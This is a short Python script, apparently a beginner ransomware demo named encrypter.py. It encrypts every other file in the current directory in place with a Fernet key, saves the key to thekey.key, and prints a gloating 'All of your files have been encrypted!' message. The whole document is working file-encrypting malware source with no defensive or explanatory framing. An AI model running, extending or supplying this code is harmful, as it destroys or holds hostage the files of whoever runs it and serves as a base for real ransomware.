#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#let's find some files

files = []

for file in os.listdir():
	if file == "encrypter.py" or file == "thekey.key" or file == "decrypter.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

#here we called a fernet library to generate a key
key = Fernet.generate_key()

#here we are using open function to create or just open a file thekey.key
with open("thekey.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

print("All of your files have been encrypted! Hahahaha...")
